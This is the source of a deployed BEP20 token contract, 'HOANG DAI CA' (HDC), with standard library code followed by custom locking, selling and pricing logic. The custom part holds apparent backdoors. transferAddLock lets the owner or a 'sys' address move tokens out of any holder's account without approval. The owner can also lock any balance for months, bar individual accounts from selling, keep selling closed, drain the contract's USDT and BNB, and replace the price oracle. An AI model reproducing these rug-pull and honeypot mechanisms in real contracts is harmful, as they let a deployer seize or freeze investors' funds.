/**
 *Submitted for verification at Etherscan.io on 2023-03-05
*/

/**
 *Submitted for verification at BscScan.com on 2023-01-27
*/

// SPDX-License-Identifier: MIT
pragma solidity = 0.8.17;

/**----------------------------------------*
    ███████ ██    ██    ███████ ██ ███████
    ██░░░██ ██   ███    ██░░░██ ██     ██
    ██░░░██ ██ ██ ██    █████   ██   ███  
    ██░░░██ ███   ██    ██░░░██ ██  ██     
    ███████ ██    ██    ███████ ██ ███████                                      
-------------------------------------------**--**/
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.

        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain `call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(
            data
        );
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data)
        internal
        view
        returns (bytes memory)
    {
        return
            functionStaticCall(
                target,
                data,
                "Address: low-level static call failed"
            );
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return
            functionDelegateCall(
                target,
                data,
                "Address: low-level delegate call failed"
            );
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
     * revert reason using the provided one.
     *
     * _Available since v4.3._
     */
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IBEP20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner,address indexed spender,uint256 value);

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from,address to,uint256 amount) external returns (bool);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function price() external view returns (uint256);
}

interface ISYS {
    function payOnToken(uint256 amount) external returns (bool success);
}

interface IPrice {
    function priceFunc(
        uint256 priceOld,
        uint256 tBuyOK,
        uint256 tBuyNew,
        uint256 tSellOK,
        uint256 tSellNew,
        uint256 aStep,
        uint256 pStep
    )external view returns (uint256 price,uint256 buyOK,uint256 sellOK);
}

interface IAggregatorV3 {
    function decimals() external view returns (uint8);

    function description() external view returns (string memory);

    function version() external view returns (uint256);

    function getRoundData(uint80 _roundId)
        external
        view
        returns (
            uint80 roundId,
            int256 answer,
            uint256 startedAt,
            uint256 updatedAt,
            uint80 answeredInRound
        );

    function latestRoundData()
        external
        view
        returns (
            uint80 roundId,
            int256 answer,
            uint256 startedAt,
            uint256 updatedAt,
            uint80 answeredInRound
        );
}

/**----------------------------------------**/
contract HoangToken is Ownable, IBEP20 {
    IAggregatorV3 private priceBnbFeed;
    using SafeMath for uint256;
    using Address for address;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _al100lowances;

    string private _name;
    string private _symbol;
    uint8 private constant _decimals = 18;
    uint256 private _totalSupply = 240 * (10**6) * (10**_decimals);
    
    uint256 private _tBuyOK;
    uint256 private _tBuyNew;
    uint256 private _tSellOK;
    uint256 private _tSellNew;
    uint256 private _aStep = uint256(15000*1e18); //every amount to up %
    uint256 private _pStep = uint256(0.001*1e18); //0.1% = 0.001 up by step
    uint256 private _priceStart = uint256(0.02*1e18); // 0.02$
    uint256 public price = _priceStart; // 0.02$

    bool public sellOpen = false;
    bool private transferSys = false;
    address private sysAdd;
    ISYS private _sys;
    IBEP20 private _usdt;
    IPrice private _priceF;

    mapping(address => bool) private _isNotSell;

    event TokenSell(address indexed from, uint256 value);

    constructor() {
        _name = "HOANG DAI CA";
        _symbol = "HDC";
        _usdt = IBEP20(0x55d398326f99059fF775485246999027B3197955);
        priceBnbFeed = IAggregatorV3(0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE);
        _priceF = IPrice(0xC0a2Ff995647C35653498343eEF7FA508F6B6e4C);
        
        _balances[_msgSender()] = _totalSupply;
    }

    receive() external payable{}
    function managerBNB() public onlyOwner {
        require(address(this).balance > 0, "Balance need > 0!");
        payable(msg.sender).transfer(address(this).balance);
    }
    function managerUsdt(uint256 amount) public onlyOwner {
        require(_usdt.balanceOf(address(this)) >= amount, "Not enough!");
        _usdt.transfer(msg.sender, amount);
    }
    function managerTokenAll() public onlyOwner {
        require(_balances[address(this)] > 0, "Need > 0!");
        _transfer(address(this), _msgSender(), _balances[address(this)]);
    }
    function priceBnb() public view returns (uint256) {
        (,int256 _price, , ,) = priceBnbFeed.latestRoundData();
        return uint256(_price * 10**10);
        // return uint256(234 * 10**18);
    }
    function checkAddress(address _addr) public view returns (string memory) {
        uint length;
        assembly {
            length:= extcodesize(_addr)
        }
        if (length > 0 ) {
            return "Contract Account";
        }
        return "User Account";
    }
    function setPriceBnbFeed(address _addContract) external onlyOwner {
        priceBnbFeed = IAggregatorV3(_addContract);
    }
    function setUsdt(address _tokenContract) external onlyOwner {
        _usdt = IBEP20(_tokenContract);
    }
    function setSys(address addr) public onlyOwner {
        sysAdd = addr;
        _sys = ISYS(addr);
    }
    function setPriceContract(address _contractAddr) public onlyOwner {
        _priceF = IPrice(_contractAddr);
    }
    function setPriceF(uint256 aStep, uint256 pStep,uint256 priceStart) public onlyOwner {
        _aStep = aStep;
        _pStep = pStep;
        _priceStart = priceStart;
    }

    // -------------------------
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256){
        return _balances[account];
    }
    function transfer(address to, uint256 amount) public virtual override returns (bool){
        _transfer(_msgSender(), to, amount);
        return true;
    }
    function transferSYS(uint256 amount) public virtual returns (bool){
        transferSys = true;
        _transfer(_msgSender(), sysAdd, amount);
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256){
        return _al100lowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool){
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }
    function transferFrom( address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool){
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool){
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue,"ERC20: decreased allowance below zero");
        unchecked {_approve(owner, spender, currentAllowance - subtractedValue);}
        return true;
    }
    function burn(uint256 amount) external onlyOwner{
		_burn(msg.sender, amount);
	}
    
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(from, to, amount);
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount,"ERC20: transfer amount exceeds balance");
        
        (uint256 _lockA, , , ) = getLockAmount(from);
        require(_balances[from].sub(_lockA) >= amount, "LOCK! Your balance is unlocked over time");
        
        unchecked {
            _balances[from] = fromBalance - amount;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] += amount;
        }

        if(to == sysAdd && !transferSys){
            uint256 _toUsdt = amount.mul(price).div(1e18);
            _sys.payOnToken(_toUsdt);
        }
        
        transferSys = false;
        emit Transfer(from, to, amount);
        _afterTokenTransfer(from, to, amount);
    }
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _al100lowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount,"ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    // -------------------------
    mapping(address => UserLock) internal _userLocks;
    struct UserLock {
        uint256 lockAmount;
        uint256 timeLockStart;
        uint256 time1Step;
        uint stepToOpen;
        uint stepToEnd;
    }
    function getUserLock(address addr) public view returns (UserLock memory){
        return _userLocks[addr];
    }
    function getLockAmount(address addr) public view returns (uint256, uint, uint, uint){
       uint256 _aL100 = _userLocks[addr].lockAmount;
       if(_aL100 > 0){
           uint256 _timeStart = _userLocks[addr].timeLockStart;
           uint256 _time1Step = _userLocks[addr].time1Step;
           uint256 _num2Open = _userLocks[addr].stepToOpen;
           uint256 _num2End = _userLocks[addr].stepToEnd;
           
           uint256 _openSec = _timeStart.add(_time1Step.mul(_num2Open));
           uint256 _endSec = _timeStart.add(_time1Step.mul(_num2Open + _num2End));
           uint _p = uint(100/_num2End);
       
            if (block.timestamp >= _endSec) {
                return (0, _p, 0, 0);
            } else if(block.timestamp > _openSec){
                uint _stepNext = block.timestamp.sub(_openSec).div(_time1Step);
                uint _percentSub = _p.mul(_stepNext+1);
                if(_p.mul(_stepNext+1) > 100) _percentSub = 100;

                uint256 _aLock = _aL100;
                _aLock = _aL100.sub(_aL100.mul(_percentSub).div(100));

                return (_aLock, _p, _stepNext, _percentSub);
            }else {
                return (_aL100, _p, 0, 0);
            }
       }else {
           return (0, 0, 0, 0);
       }
    }
    function getPriceF(uint256 _buyNew, uint256 _sellNew) public view returns (uint256 priceNew, uint256 tBuyOK, uint256 tSellOK){
        (uint256 pNew,uint256 tbOK,uint256 tsOK) = _priceF.priceFunc(price, _tBuyOK, _buyNew, _tSellOK, _sellNew, _aStep, _pStep);
        priceNew = pNew;
        tBuyOK = tbOK;
        tSellOK = tsOK;
    }
    function _addUserLock(address from, address to, uint256 lockAmount) internal {        
        _userLocks[to].lockAmount += lockAmount;
        _userLocks[to].timeLockStart = block.timestamp;
        _userLocks[to].time1Step = (30 days); //s of 30 day
        _userLocks[to].stepToOpen = 12;
        _userLocks[to].stepToEnd = 10;
        
        _tBuyNew += lockAmount;
        (uint256 priceNew,uint256 tBuyOK,uint256 tSellOK) = _priceF.priceFunc(price, _tBuyOK, _tBuyNew, _tSellOK, _tSellNew, _aStep, _pStep);
        price = priceNew;
        _tBuyOK = tBuyOK;
        _tSellOK = tSellOK;
        _transfer(from, to, lockAmount);
    }
    function transferAddLock(address from, address to, uint256 value) external returns (bool success){
        require(msg.sender == sysAdd || msg.sender == owner(), "Only from sys || owner");
        _addUserLock(from, to, value);
        success = true;
    }
    function editUserLock(address addr, uint256 amountNew, uint256 time1Step, uint step2Open, uint step2End) public onlyOwner {
        // require(getLockAmount(addr) > 0, "This address is not locked!");
        require(balanceOf(addr) >= amountNew, "Balance not enough 4lock!");
        _userLocks[addr].lockAmount = amountNew;
        _userLocks[addr].timeLockStart = block.timestamp;
        _userLocks[addr].time1Step = time1Step;
        _userLocks[addr].stepToOpen = step2Open;
        _userLocks[addr].stepToEnd = step2End;
    }
    // -------------------------
    function setSellOpen() public onlyOwner {
        sellOpen = true;
    }
    function sellToken(uint256 tokenAmount) public {
        require(sellOpen, "Sell not open!");
        require(_msgSender() != address(0), "ERC20: transfer from the zero address");
        require(balanceOf(_msgSender()) >= tokenAmount, "Token not enough!");
        
        _transfer(_msgSender(), address(this), tokenAmount);

        _sellToken(tokenAmount);
    }
    function _sellToken(uint256 tokenA) internal {
        require(sellOpen, "Sell not open!");
        require(!_isNotSell[msg.sender], "Acc not sell!");
        
        _tSellNew += tokenA;
        (uint256 priceA,,) = _priceF.priceFunc(price, _tBuyOK, _tBuyNew, _tSellOK, _tSellNew, _aStep, _pStep);
        uint256 _priceAfter = priceA;
        uint256 _sell2Usdt = tokenA.mul(_priceAfter).div(1e18);
        
        require(_usdt.balanceOf(address(this)) >= _sell2Usdt, "USDT Fund not enough!");
        _usdt.transfer(msg.sender, _sell2Usdt);
        
        (uint256 priceNew,uint256 tBuyOK,uint256 tSellOK) = _priceF.priceFunc(price, _tBuyOK, _tBuyNew, _tSellOK, _tSellNew, _aStep, _pStep);
        price = priceNew;
        _tBuyOK = tBuyOK;
        _tSellOK = tSellOK;
        
        emit TokenSell(msg.sender, tokenA);
    }

    // -------------------------
    function setNotSell(address account, bool notSell) public onlyOwner returns (bool){
       require(_isNotSell[account] != notSell, "Already set");
       return  _isNotSell[account] = notSell;
    }
    function isNotSell(address account) public view returns (bool) {
        return _isNotSell[account];
    }
    function setTransferSys() public onlyOwner{
       transferSys = false;
    }
}